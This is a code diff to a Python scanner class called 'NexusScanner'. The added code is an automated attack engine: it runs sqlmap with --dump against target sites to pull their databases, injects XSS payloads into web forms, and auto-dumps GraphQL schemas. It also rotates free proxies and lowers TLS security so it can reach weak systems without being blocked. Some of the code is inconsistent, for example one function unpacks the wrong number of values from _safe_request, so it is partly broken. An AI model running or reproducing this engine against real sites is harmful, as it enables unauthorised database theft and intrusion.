+                         vuln = Vulnerability(target=url, vuln_type=vuln_type, severity="CRITICAL", impact=f"Time-based execution confirmed (Latency: {latency:.2f}s, Avg Baseline: {avg:.2f}s)")
+                         self._emit_finding(vuln)
+                         self.log_message.emit(f"<span style='color:#ff0055'>[Governor] APEX BLIND {vuln_type} DETECTED: {url} (Delayed {latency:.2f}s)</span>")
+                         self.save_evidence(url, "Blind_Injection", f"Detected delay: {latency:.2f}s over an average of {avg:.2f}s.")
              
              for indicator in indicators:
                  if indicator in text_content: 
@@ -1284,6 +1249,12 @@ class NexusScanner(QObject):
             return None
 
     def _emit_finding(self, vuln):
+        # Create a unique signature to prevent duplicate findings
+        signature = f"{vuln.target}|{vuln.vuln_type}|{vuln.impact}"
+        if signature in self.emitted_hashes:
+            return # Skip duplicate finding
+        self.emitted_hashes.add(signature)
+
         self.total_findings += 1
         if vuln.severity == "CRITICAL": 
             self.critical_findings += 1
@@ -1334,10 +1305,18 @@ class NexusScanner(QObject):
                 self.log_message.emit("<span style='color:#00f3ff'>[*] Initializing Proxychains (Free Proxy Rotation)...</span>")
                 await self.proxy_manager.initialize()
                 
-            connector = aiohttp.TCPConnector(ssl=False)
+            # Governor mode TLS Fingerprinting Bypass Support
+            ssl_context = False
+            if getattr(self, 'governor_mode', False):
+                import ssl
+                ssl_context = ssl.create_default_context()
+                ssl_context.set_ciphers('DEFAULT@SECLEVEL=1') # Lower seclevel to connect to weak legacy systems
+                ssl_context.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1 # Force modern
+                
+            connector = aiohttp.TCPConnector(ssl=ssl_context)
             self.session = aiohttp.ClientSession(connector=connector, read_bufsize=65536)
             
-            self.log_message.emit("<h3 style='color:#00ff9d'>[*] INITIALIZING NEXUS V20 CORE...</h3>")
+            self.log_message.emit("<h3 style='color:#00ff9d'>[*] INITIALIZING NEXUS V21 CORE...</h3>")
             self.log_message.emit(f"[*] Engine: Asyncio + Semaphore(50) | Bypass Mode: {self.bypass_mode}")
             self.log_message.emit("[*] Auto-Evidence Collection: ENABLED")
             
@@ -1426,6 +1405,10 @@ class NexusScanner(QObject):
                 await self.check_sensitive_files(url)
                 await self.check_balance_tampering(url)
                 
+                # Governor Mode GraphQL Dump
+                if getattr(self, 'governor_mode', False):
+                    asyncio.create_task(self._dump_graphql(url))
+                
                 # Cloud Bucket Enum
                 if self.targets and "domain" in self.targets[0]: # heuristic
                      pass # Already handled in enumerate_subdomains
@@ -1501,7 +1484,7 @@ class NexusScanner(QObject):
                              
                              async def analyze_asset(asset_url):
                                   try:
-                                       s, c, _ = await self._safe_request('GET', asset_url, timeout=5)
+                                       s, c, _, _ = await self._safe_request('GET', asset_url, timeout=5)
                                        if c:
                                             self.extract_sensitive_data(c.decode('utf-8', errors='ignore'), asset_url)
                                   except:
@@ -1538,6 +1521,25 @@ class NexusScanner(QObject):
                             if not self.is_running: break
                             await self.fuzz_parameters(f_url, tech_stack)
                     
+                    # Ensure aborted scans don't bleed into new logic
+                    if not self.is_running: 
+                        break
+
+                    # -----------------------------------------------------
+                    # AUTOMATED SQL, XSS, and OWASP ENGINE INJECTION
+                    # -----------------------------------------------------
+                    if self.deep_scan:
+                        self.log_message.emit("<br><span style='color:#ff00ff'>[☠️] INITIATING OWASP TOP 10, SQLMAP & XSS AUTOMATION...</span>")
+                        
+                        # XSS Automated Scan
+                        self.log_message.emit(f"<span style='color:#00f3ff'>[*] Starting Global XSS Injection on {url}...</span>")
+                        await self._run_xss_scan(url)
+                        
+                        # SQLMap Engine Integration
+                        self.log_message.emit(f"<span style='color:#00f3ff'>[*] Starting SQLMap Auto-Dump Engine on {url}...</span>")
+                        await self._run_sqlmap_scan(url)
+                    # -----------------------------------------------------
+                    
                     # Close Browser Session
                     await browser_scanner.stop()
 
@@ -1565,7 +1567,7 @@ class NexusScanner(QObject):
     async def detect_cms(self, url):
         """Detects common CMS using heuristic checks."""
         try:
-            status, content, _ = await self._safe_request('GET', url, headers=self.get_headers())
+            status, content, _, _ = await self._safe_request('GET', url, headers=self.get_headers())
             text = content.decode('utf-8', errors='ignore').lower()
             
             if "wp-content" in text or "wp-includes" in text: return "wordpress"
@@ -1579,3 +1581,168 @@ class NexusScanner(QObject):
             return None
         except:
             return None
+
+    # ==========================================
+    # DEEP GRAPHQL ANALYSIS
+    # ==========================================
+    async def _dump_graphql(self, base_url):
+        """Tries to discover and auto-dump GraphQL schemas for Governor Mode."""
+        parsed = urlparse(base_url)
+        # Common GQL endpoints
+        endpoints = ["/graphql", "/api/graphql", "/v1/graphql", "/v2/graphql", "/query"]
+        
+        introspection_query = '''{"query":"\\n    query IntrospectionQuery {\\n      __schema {\\n        queryType { name }\\n        mutationType { name }\\n        subscriptionType { name }\\n        types {\\n          ...FullType\\n        }\\n        directives {\\n          name\\n          description\\n          locations\\n          args {\\n            ...InputValue\\n          }\\n        }\\n      }\\n    }\\n\\n    fragment FullType on __Type {\\n      kind\\n      name\\n      description\\n      fields(includeDeprecated: true) {\\n        name\\n        description\\n        args {\\n          ...InputValue\\n        }\\n        type {\\n          ...TypeRef\\n        }\\n        isDeprecated\\n        deprecationReason\\n      }\\n      inputFields {\\n        ...InputValue\\n      }\\n      interfaces {\\n        ...TypeRef\\n      }\\n      enumValues(includeDeprecated: true) {\\n        name\\n        description\\n        isDeprecated\\n        deprecationReason\\n      }\\n      possibleTypes {\\n        ...TypeRef\\n      }\\n    }\\n\\n    fragment InputValue on __InputValue {\\n      name\\n      description\\n      type { ...TypeRef }\\n      defaultValue\\n    }\\n\\n    fragment TypeRef on __Type {\\n      kind\\n      name\\n      ofType {\\n        kind\\n        name\\n        ofType {\\n          kind\\n          name\\n          ofType {\\n            kind\\n            name\\n            ofType {\\n              kind\\n              name\\n              ofType {\\n                kind\\n                name\\n                ofType {\\n                  kind\\n                  name\\n                  ofType {\\n                    kind\\n                    name\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        }\\n      }\\n    }\\n  "}'''
+
+        for path in endpoints:
+            target = f"{parsed.scheme}://{parsed.netloc}{path}"
+            headers = self.get_headers()
+            headers["Content-Type"] = "application/json"
+            
+            s, c, _, _ = await self._safe_request('POST', target, headers=headers, data=introspection_query, timeout=5)
+            if s == 200 and c:
+                try:
+                    import json
+                    resp = json.loads(c.decode('utf-8'))
+                    if "data" in resp and "__schema" in resp["data"]:
+                        self.log_message.emit(f"<span style='color:#ff0055; font-weight:bold'>[Governor] CRITICAL: GraphQL Introspection Enabled at {target}!</span>")
+                        self.save_evidence(target, "GraphQL_Schema_Dump", c)
+                        vuln = Vulnerability(target=target, vuln_type="GraphQL Introspection Enabled", severity="HIGH", impact="Full API schema dumped to evidence folder.")
+                        self._emit_finding(vuln)
+                        break # Successfully found and dumped
+                except: pass
+
+    # ==========================================
+    # AUTOMATED INJECTION ENGINES
+    # ==========================================
+    async def _run_sqlmap_scan(self, url):
+        """Native SQLi automation with auto dump to scans/dumps/"""
+        import sys, os
+        sqlmap_path = os.path.join(os.getcwd(), "sqlmap-master", "sqlmap.py")
+        if not os.path.exists(sqlmap_path):
+            self.log_message.emit(f"<span style='color:#ff0055'>[!] SQLMap Engine not found at {sqlmap_path}. Skipping SQLi automation.</span>")
+            return
+            
+        parsed = urlparse(url)
+        safe_hostname = "".join([c if c.isalnum() or c in ".-" else "_" for c in parsed.hostname])
+        
+        # Specific user requirement: dump to scan/dumps/ folder
+        dump_dir = os.path.join(os.getcwd(), "scans", "dumps", safe_hostname)
+        os.makedirs(dump_dir, exist_ok=True)
+        
+        # Automated SQLMap sequence for all endpoints
+        cmd = [
+            sys.executable, sqlmap_path, "-u", url, 
+            "--batch", "--forms", "--crawl=2", "--dump", 
+            "--output-dir", dump_dir, "--random-agent", "--level=1", "--risk=1", 
+            "--threads=2"
+        ]
+        
+        self.log_message.emit(f"<span style='color:#aaa'>    - Executing SQLMap background agent...</span>")
+        
+        try:
+            process = await asyncio.create_subprocess_exec(
+                *cmd,
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.STDOUT
+            )
+            
+            found_sqli = False
+            
+            # Read stdout asynchronously without freezing GUI
+            while True:
+                if not self.is_running:
+                    process.terminate()
+                    break
+                    
+                line = await process.stdout.readline()
+                if not line: break
+                
+                decoded = line.decode('utf-8', errors='ignore').strip().lower()
+                
+                if ("is vulnerable" in decoded or "is injectable" in decoded or "' injectable" in decoded) and "not " not in decoded:
+                    found_sqli = True
+                    self.log_message.emit(f"<span style='color:#ff0055; font-weight:bold'>[!] SQL INJECTION FOUND: {decoded.upper()}</span>")
+                elif "retrieved:" in decoded or "dumped to csv file" in decoded:
+                    self.log_message.emit(f"<span style='color:#00ff9d'>[☠️] DATABASE EXTRACTION SUCCESS: {decoded.upper()}</span>")
+                elif "warning" in decoded or "error" in decoded:
+                    self.log_message.emit(f"<span style='color:#aaaaaa'>[SQLMap] {decoded.capitalize()}</span>")
+                    
+            await process.wait()
+            
+            if found_sqli:
+                 vuln = Vulnerability(target=url, vuln_type="SQL Injection (SQLMap Automated)", severity="CRITICAL", impact=f"Data dumped to {dump_dir}")
+                 self._emit_finding(vuln)
+                 self.log_message.emit(f"<span style='color:#ff00ff'>[+] SQLMap execution finished. DUMPS SAVED IN: {dump_dir}</span>")
+            else:
+                 self.log_message.emit(f"<span style='color:#aaa'>    - SQLMap finished. No automated exploitation possible.</span>")
+                 
+        except Exception as e:
+            self.log_message.emit(f"<span style='color:#ff0000'>[!] SQLMap execution error: {e}</span>")
+
+    async def _run_xss_scan(self, url):
+        """Native XSS reflection attack on discovered forms"""
+        from bs4 import BeautifulSoup as bs
+        from urllib.parse import urljoin
+        
+        xss_payloads = [
+            "<script>alert('XSS')</script>",
+            "\"'><script>alert('XSS')</script>",
+            "<img src=x onerror=alert('XSS')>",
+            "javascript:alert(1)//"
+        ]
+        
+        status, content, _, _ = await self._safe_request('GET', url, timeout=10)
+        if not content: return
+        
+        soup = bs(content, "html.parser")
+        forms = soup.find_all("form")
+        
+        if not forms:
+            self.log_message.emit("<span style='color:#aaa'>    - No forms found on root for XSS injection. (Crawler may find more).</span>")
+            return
+            
+        self.log_message.emit(f"<span style='color:#ffcc00'>    - Found {len(forms)} forms. Injecting polymorphic XSS payloads...</span>")
+        
+        for i, form in enumerate(forms):
+            if not self.is_running: break
+            
+            action = form.attrs.get("action", "")
+            method = form.attrs.get("method", "get").lower()
+            target_url = urljoin(url, action) if action else url
+            
+            inputs = []
+            for input_tag in form.find_all("input"):
+                inputs.append({
+                    "type": input_tag.attrs.get("type", "text"),
+                    "name": input_tag.attrs.get("name")
+                })
+                
+            for payload in xss_payloads:
+                if not self.is_running: break
+                
+                data = {}
+                valid_input = False
+                for inp in inputs:
+                    if inp.get("name"):
+                        if inp["type"] in ["text", "search", "email", "password"]:
+                            data[inp["name"]] = payload
+                            valid_input = True
+                        else:
+                            data[inp["name"]] = "test"
+                            
+                if not valid_input: continue
+                
+                try:
+                    if method == "post":
+                        s, c, _ = await self._safe_request('POST', target_url, data=data, timeout=5)
+                    else:
+                        s, c, _ = await self._safe_request('GET', target_url, params=data, timeout=5)
+                    
+                    if c and payload.encode() in c:
+                        vuln = Vulnerability(target=target_url, vuln_type="Cross-Site Scripting (Reflected XSS)", severity="HIGH", impact=f"Payload Reflected: {payload[:25]}")
+                        self._emit_finding(vuln)
+                        self.log_message.emit(f"<span style='color:#ff0055'>[!] VULNERABLE TO XSS: {target_url} (Payload executed)</span>")
+                        self.save_evidence(target_url, "XSS_Reflection", c)
+                        break # Found vulnerability on this form, break payload loop to save time
+                except Exception: 
+                    pass
